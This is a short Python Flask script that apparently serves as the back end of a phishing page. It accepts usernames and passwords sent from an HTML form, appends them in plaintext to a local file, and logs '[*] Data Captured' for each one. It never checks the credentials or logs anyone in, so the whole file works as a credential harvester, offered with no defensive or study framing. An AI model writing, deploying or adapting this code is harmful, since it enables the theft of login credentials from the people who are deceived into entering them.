from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app) # This allows your HTML file to talk to the server

data_file = "login_data.txt"

@app.route('/submit', methods=['POST'])
def submit_data():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    if username and password:
        with open(data_file, 'a') as file:
            file.write(f"Username: {username}, Password: {password}\n")
        print(f"[*] Data Captured: {username}") 
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "fail"}), 400

if __name__ == '__main__':
    # Ensure the storage file exists
    if not os.path.exists(data_file):
        open(data_file, 'w').close()
    app.run(debug=True, port=8000)
